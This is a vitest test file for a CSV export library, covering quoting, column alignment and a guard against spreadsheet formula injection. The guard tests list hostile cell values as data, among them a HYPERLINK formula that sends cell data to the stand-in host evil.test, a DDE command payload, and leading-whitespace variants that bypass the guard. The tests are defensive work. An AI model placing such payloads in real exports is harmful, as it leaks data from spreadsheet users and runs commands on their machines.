import { describe, expect, test } from "vitest";
import {
  buildCsvFile,
  csvField,
  csvHeaderLine,
  isFormulaInjection,
  rowsToCsv,
  rowsToCsvBody,
  stripBom,
  toCsv,
  CSV_BOM,
} from "./csv";

describe("csvField — RFC4180 quoting", () => {
  test("quotes only when it must, and doubles embedded quotes", () => {
    expect(csvField("plain")).toBe("plain");
    expect(csvField("a,b")).toBe('"a,b"');
    expect(csvField('say "hi"')).toBe('"say ""hi"""');
    expect(csvField("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  test("null/undefined become empty, never the string 'null'", () => {
    expect(csvField(null)).toBe("");
    expect(csvField(undefined)).toBe("");
  });
});

describe("csvField — formula-injection guard", () => {
  // Every cell below is user-typed text that reaches an export: a person's
  // name, a note, or a free-text form answer. Excel / LibreOffice / Google
  // Sheets evaluate these as FORMULAS on open, so an exported file becomes an
  // exfiltration vector unless the value is neutralized.
  test.each([
    ["=1+1", "bare equals"],
    ["+1+1", "plus"],
    ["-1+1", "minus"],
    ["@SUM(A1)", "at"],
    ["\tfoo", "tab lead"],
    ["\rfoo", "carriage return lead"],
    ['=HYPERLINK("http://evil.test?leak="&A1,"Click")', "hyperlink exfil"],
    ["=cmd|' /c calc'!A0", "DDE"],
  ])("guards %j (%s)", (raw) => {
    expect(isFormulaInjection(raw)).toBe(true);
    expect(csvField(raw).replace(/^"/, "")).toMatch(/^'/);
  });

  // REGRESSION (adversarial review, 2026-07-31). The guard was anchored
  // strictly at index 0, so a single leading space defeated it entirely —
  // while every spreadsheet strips leading whitespace on CSV import and
  // evaluates the formula anyway. A free-text form answer was enough to
  // exploit it; no privilege required.
  test.each([
    [' =HYPERLINK("http://evil.test","x")', "one leading space"],
    ["   =1+1", "several leading spaces"],
    [" =cmd|' /c calc'!A0", "leading space + DDE"],
    ["\t =1+1", "tab then space"],
  ])("guards %j (%s) — leading whitespace does not bypass", (raw) => {
    expect(isFormulaInjection(raw)).toBe(true);
    // The neutralized value is quoted (it starts with a quote-worthy char or
    // gains one), and the apostrophe precedes the payload.
    expect(csvField(raw)).toContain("'");
    expect(csvField(raw).indexOf("'")).toBeLessThan(
      csvField(raw).indexOf("="),
    );
  });

  test("does NOT corrupt legitimate data", () => {
    // Real numbers are never guarded — otherwise every negative money amount
    // in a giving or finance export would arrive as text with a stray quote.
    expect(csvField(-42.5)).toBe("-42.5");
    expect(csvField(0)).toBe("0");
    expect(csvField(1234)).toBe("1234");
    expect(csvField(true)).toBe("true");
    // Ordinary text is untouched.
    expect(csvField("Jordan Smith")).toBe("Jordan Smith");
    expect(csvField("O'Brien")).toBe("O'Brien");
    expect(csvField("hello world")).toBe("hello world");
  });

  test("a negative-looking STRING is still guarded", () => {
    // A string is user-typed text even when it looks numeric, so it gets the
    // guard; the number path above is what protects real amounts.
    expect(isFormulaInjection("-42.50")).toBe(true);
    expect(csvField("-42.50")).toBe("'-42.50");
  });
});

describe("keyed serialization", () => {
  const columns = [
    { key: "id", label: "ID" },
    { key: "name", label: "Name" },
    { key: "note", label: "Note" },
  ];

  test("a missing key is an empty cell in the RIGHT column, never a shift", () => {
    // This is the invariant that keeps a dynamic column set (one column per
    // form question) honest — a positional array would silently shift every
    // column after a gap and produce a plausible, wrong file.
    const csv = rowsToCsv(columns, [{ id: "1", note: "kept" }]);
    const [header, row] = csv.split("\r\n");
    expect(header).toBe("ID,Name,Note");
    expect(row).toBe("1,,kept");
    expect(row.split(",")).toHaveLength(3);
  });

  test("extra keys not in the column list are dropped, not appended", () => {
    const csv = rowsToCsv(columns, [{ id: "1", name: "A", stray: "nope" }]);
    expect(csv).not.toContain("nope");
    expect(csv.split("\r\n")[1]).toBe("1,A,");
  });

  test("header line and body compose to the same bytes as rowsToCsv", () => {
    const rows = [{ id: "1", name: "A", note: "x" }];
    expect(`${csvHeaderLine(columns)}\r\n${rowsToCsvBody(columns, rows)}`).toBe(
      rowsToCsv(columns, rows),
    );
  });

  test("an empty page serializes to nothing, not a stray line break", () => {
    expect(rowsToCsvBody(columns, [])).toBe("");
  });
});

describe("file wrapping", () => {
  test("buildCsvFile adds the BOM and a trailing CRLF", () => {
    const file = buildCsvFile("a,b");
    expect(file.startsWith(CSV_BOM)).toBe(true);
    expect(file.endsWith("\r\n")).toBe(true);
    expect(stripBom(file)).toBe("a,b\r\n");
  });

  test("toCsv joins with CRLF and no trailing newline", () => {
    expect(toCsv(["a"], [["1"], ["2"]])).toBe("a\r\n1\r\n2");
  });
});
